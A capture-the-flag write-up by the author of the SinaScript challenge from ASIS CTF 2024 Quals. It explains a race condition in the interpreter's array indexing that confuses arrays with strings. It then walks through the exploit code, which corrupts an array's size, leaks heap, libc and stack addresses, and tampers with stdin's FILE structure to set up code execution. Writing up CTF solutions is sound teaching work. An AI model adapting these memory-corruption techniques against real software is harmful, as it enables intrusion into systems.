# ASIS CTF 2024 Quals - SinaScript

**Summary**: a TOCTOU race condition when accessing an index of an array in the SinaScript language interpreter that will lead to a type confusion of arrays with strings and OOB read/write on the heap. The OOB read/write on the heap can be used to overwrite the size field of an array to get arbitrary read/write, and then FSOP to RCE.

## Intro

SinaScript was a programming language interpreter that I wrote in C for this challenge initially, but then I decided to make it a seperate project and keep working on it. This challenge was compiled from [this commit of SinaScript](https://github.com/sinamhdv/sinascript/tree/dc579704e60534ac0c8d5a6087d2ef10323211c0). The `sinascript` binary, a `Dockerfile` to simulate the remote environment, and the `run.py` script to receive source code from players and run it with `sinascript` were given to the players. The `exploit.ss` file (which can also be found [here](https://github.com/sinamhdv/sinascript/blob/dc579704e60534ac0c8d5a6087d2ef10323211c0/exploits/exploit.ss)) is the solution to this challenge.

The challenge will run `run.py` upon connection from players, which will ask them to provide arbitrary SinaScript code with length less than 10KB and will then run the code with the `sinascript` interpreter binary and display the output.

## Vulnerability

The vulnerability is in the `vm_get_index_reference` function in `vm.c`. SinaScript has multithreading functionality through the use of `async` keyword. `async` will basically spawn a new thread and have the thread execute the subtree of the `async` node in the AST, while the main thread will continue execution after that block.

```js
a = 0;
async {
	a = 1;
}
a = 2;
show(a, "\n");
```

It uses a mutex to prevent race conditions in some critical code paths. However, it doesn't use the mutex in the `vm_get_index_reference` function, which causes a TOCTOU race condition. Consider the code of this function running for an array access operation like `arr[1+2]`:

```C
static SSValue *vm_get_index_reference(AstNode *node) {
	DBGCHECK(node->type == AST_INDEX);
	DBGCHECK(node->subs.size == 2);
	AstNode *arr_name = node->subs.arr[0];
	AstNode *index_expr = node->subs.arr[1];
	if (arr_name->type != AST_IDENTIFIER)
		fatal_runtime_error(node);
	SSValue *arr_ref = vm_get_var_reference(&(arr_name->ident), 0);
	if (arr_ref == NULL)
		fatal_runtime_error(node);

	// step 1: checking the type of the variable 'arr' is an array
	if (arr_ref->type != SSVALUE_ARR)
		fatal_runtime_error(node);

	// step 2: evaluating the 1+2 expression into a number that will be used as the index to access
	SSValue index_val = vm_evaluate_expression(index_expr);
	if (index_val.type != SSVALUE_NUM)
		fatal_runtime_error(node);

	// step 3: do bounds-checking on the array and access the index
	SSArray *arr = ((SSArray *)arr_ref->value);
	size_t access_idx = (size_t)index_val.value;
	if (access_idx >= arr->size)
		fatal_runtime_error(node);
	return &arr->data[access_idx];
}
```

In the code above, the check for the type of the array is done first in step 1, and then an arbitrarily long computation via `vm_evaluate_expression` is done before actually accessing the index of the array. Since we're not using the mutex lock in this function, another thread could change the type of the variable `arr` between steps 1 and 3 (and while `vm_evaluate_expression` is running in step 2). We can change the type of `arr` to a string. Looking at the string and array structs in SinaScript:

```C
typedef struct SSArray {
	SSHeapHeader hhdr;
	size_t size;
	SSValue data[];
} SSArray;

typedef struct SSString {
	SSHeapHeader hhdr;
	size_t size;
	char data[];
} SSString;
```

They are mostly similar. However, index `i` of an array is at offset `i*sizeof(SSValue)` which is `i*16` from its `data` field, while index `i` of a string is at offset `i*sizeof(char)` so just `i`. This way, by changing `arr` to a string of length 16, we can access indexes up to `16*16` bytes into the `data` field, while the string itself only allocates `16` bytes for its data buffer.

## Exploitation

From `exploit.ss`:

```js
arr = [5];
str = "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD";
oob = [9,9,9,9];
refoob = oob;
async {
	arr = str;
}

arr[5+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0
+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0
+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0
+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0
+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0
+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0
+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0
+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0
+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0
+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0
+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0] = -1;

async{}

show(arr, "\n");
```

The `5+0+0+0+...` in the index field is there to make the step 2 of the `vm_get_index_reference` function take longer so that the other thread in the async block can have enough time to replace `arr` with a string. This also might depend on the CPU speed of the computer running the code. To make the exploit work on the remote CTF server, I had to increase the number of `+0`s in that expression to make the process of evaluating it take even longer. Then by looking at the heap layout in gdb I realized that writing to index `5` of the now-corrupted `arr` will overwrite `oob`'s size field. So I just set the size of `oob` to -1 (`0xffffffffffffffff`). This gives me arbitrary read/write over the whole process memory (although, since array members are `SSValue`s, we can only read/write qwords at addresses with a low-nibble of 8 and the qword before it not being the `SSVALUE_ARR` or `SSVALUE_STR` types).

```js
heapLeak = 0 + oob[-16];
heapLeak = heapLeak + 27 * 16;
show("heapLeak:", heapLeak, "\n");

tmp = [7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,
	7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7];
[1,1,1,1,1,1,1,1];
tmp = 0;

libcLeak = 0 + oob[35];
libcLeak = libcLeak - 2112288;
show("libcLeak:", libcLeak, "\n");

stackLeak = 0 + oob[(libcLeak + 2114416 - heapLeak) / 16];
show("stackLeak:", stackLeak, "\n");
```

Then in the code above (also from `exploit.ss`) I read a heap leak from the heap. Then, I allocate a big chunk, allocate (and immediately free) a smaller tcache-bin sized chunk (to prevent the big chunk from being consolidated with top chunk after being freed), and free the big chunk (`tmp`) by deleting its reference (this version of SinaScript uses reference counting to manage the heap), to get the chunk into unsorted bin and get a libc pointer on the heap.

Then, I read that libc pointer to get a libc leak, and then read and leak a stack value from the stack.

The reason I'm doing `libcLeak = 0 + ...` or basically adding 0 to every leaked value is that the values read from memory using `oob` might be `SSValue`s that have an invalid `type` field, but an addition of the form `<number> + <invalid type>` will actually fix the invalid type and change it to a number (this is due to how the function `SSValue_add` function in `ssvalue.c` handles the types of the operands). So we won't get a segfault or issue due to invalid types when using or printing those leaks.

```js
stdin = libcLeak + 2111712;
oob[(stdin + 48 - heapLeak) / 16] = stdin;
alert(1234);
alert(1234);
```

Now I overwrite `stdin` struct's `_IO_buf_base` pointer to point to the `stdin` struct itself, and make to calls to `alert` (which will call `getchar` internally) to do FSOP. For the next steps of the exploitation, a python script will receive the leaked values from the remote and use them to send an FSOP payload to get remote code execution. The `send_exploit_fsop2.py` script does this by doing an FSOP vtable attack.
